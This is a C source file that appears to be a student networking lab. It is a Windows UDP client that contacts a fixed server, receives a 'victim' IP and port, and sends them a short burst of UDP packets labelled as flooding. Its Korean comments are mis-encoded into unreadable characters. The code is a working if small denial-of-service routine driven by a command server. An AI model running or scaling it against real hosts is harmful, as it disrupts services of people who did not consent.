#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <WinSock2.h> // ������ ������ ����ϱ� ���� �ʿ��� �Լ����� �ִ� �������
#include <stdlib.h>
#pragma comment(lib,"ws2_32.lib") 

#define BUFSIZE 512 

// UDP client: socket() -> sendto() -> recvfrom() -> closesocket()
// Ŭ���̾�Ʈ�� ���� �ڽ��� ���ϴ� ������ ������ ���ϴ� �����͸� ��ų� �۾�����
// -> ���� �ּ� ����, ������ �ְ�޴� ������ ����
// udp�� �񿬰����̱� ������ �����ִ� ������ �ܼ��� �����ϱ⸸ �ϸ��.

int main(int argc, char* argv[]) {
	WSADATA winsockData; // ���� �ʱ�ȭ ����ü
	SOCKET clientSocket; // ���� ����ü
	SOCKADDR_IN clientAddr; // ���� �ּ� ����ü, Ŭ���̾�Ʈ�� �ּ� ������ ��� ����
	SOCKADDR_IN serverAddr; // ���� �ּ� ����ü, ������ �ּ� ������ ��� ����

	int clientSize;
	char buf[BUFSIZE + 1] = { "IMHACKER_2018111353" }; // �ְ� ���� �����͸� ������ ����, �켱 ������ ���� �޼����� buf�� ����
	int sendLen;
	int recvLen=strlen(buf);
	
	// 1. ���� �ʱ�ȭ  (�ʼ�)
	if (WSAStartup(0x202, &winsockData) == SOCKET_ERROR) { // �ʱ�ȭ ���� ���� ó��
		printf("���� �ʱ�ȭ ���� \n"); // �ʱ�ȭ ���� �߻�
		WSACleanup();
		return -1;
	}
	printf("\n1. ���� �ʱ�ȭ ���� \n"); // ���� �ʱ�ȭ ����

	memset(&serverAddr, 0, sizeof(serverAddr));
	memset(&clientAddr, 0, sizeof(clientAddr));
	
	serverAddr.sin_family = AF_INET; // IPv4 ���
	serverAddr.sin_addr.s_addr = inet_addr("114.70.37.17"); // ���� �׽�Ʈ, ���� ��ſ� ����� ������ �ּ�
	serverAddr.sin_port = htons(10004); // ��Ʈ��ũ ����Ʈ ���� ����, ���� ��ſ� ����� ��Ʈ �ּ�

	
	// 2. ���� ����
	clientSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); // ���� ���� �Լ�, ������ ����, ���� ���Ͽ� �ش��ϴ� ���� ��ũ���� �����ϴ� �Լ�,UDP �������� ���
	if (clientSocket == INVALID_SOCKET) { // ���� ���� ���� ����ó��
		printf("���� ���� ���� \n"); //���� ���� ����
		WSACleanup();
		return -1;
	}
	printf("2. ���� ���� ����\n"); // ���� ���� ����


		// 3. ������ ������ ������ (IMHACKER_2018111353 -> buf�� ����Ǿ�����)
		sendLen = sendto(clientSocket, buf, recvLen, 0,
			(struct sockaddr*)&serverAddr, sizeof(serverAddr)); // ���Ͽ� �����͸� ���� �Լ�

		if (sendLen != recvLen) { // ���� ó��
			printf(" sendto() error.\n");
			return -1;
		}
		printf("\n3. ������ ������ ������ ����\n");
		printf("-> ���� ������: %s\n", buf);


		//4. ������ ���� ���� ������ �ޱ�
		clientSize = sizeof(clientAddr);

		memset(buf, 0, BUFSIZE); // buf �ʱ�ȭ

		recvLen = recvfrom(clientSocket, buf, BUFSIZE, 0,
			(struct sockaddr*) & clientAddr, &clientSize); // �������κ��� �����͸� �о���̴� �Լ�, buf�� �����͸� ����

		if (recvLen < 0) {
			printf(" recvfrom() error.\n"); // ���� ó��
			return -1;
		}

		printf("\n4. ������ ���� ���� �ޱ� ����\n");
		printf("-> ���� ������: %s\n", buf);

		// "OKAY_ip:port" ���·� ���� ����� ������ ���� ���� �˰� ����
		//�ش� ���ڿ��� ��ū���� ������ IP,PORT ������ ���� str[1],str[2] �� ����� ��
		//(OKAY�� str[0] �� ����� ���̰� ������� ���� ��)

		char *ptr = strtok(buf, "_:"); // _�� : �������� ���ڿ� �и�
		char *str[3] = { NULL, }; // �и��� ��ū�� ������ �迭
		int i = 0;

		while (ptr != NULL) { // ���ڿ��� ���� �� ���� �и����� ����
			str[i] = ptr;
			i++;
			ptr = strtok(NULL, "_:");
		}

		char *victim_ip = str[1]; // ip������ ���ڿ��� ����
		int victim_port = atoi(str[2]); // port������ ������ ����

		// udp flooding ����
		serverAddr.sin_addr.s_addr = inet_addr(victim_ip); // ���� ����� ip
		serverAddr.sin_port = htons(victim_port); // ���� ����� port

		printf("5. ���� ������� flooding ���� ����\n");
		
		for (int i = 0; i < 10; i++) { // ������ ������ 10�� ����
			sendLen = sendto(clientSocket, "2018111353", recvLen, 0,
				(struct sockaddr*)&serverAddr, sizeof(serverAddr)); // �� �й� ���� ������

			if (sendLen != recvLen) {
				printf(" sendto() error.\n"); // ���� ó��
				return -1;
			}
		}

		printf("6. UDP flooding ����\n\n");

		closesocket(clientSocket); // ���� ����
		WSACleanup();
		return 0;

}

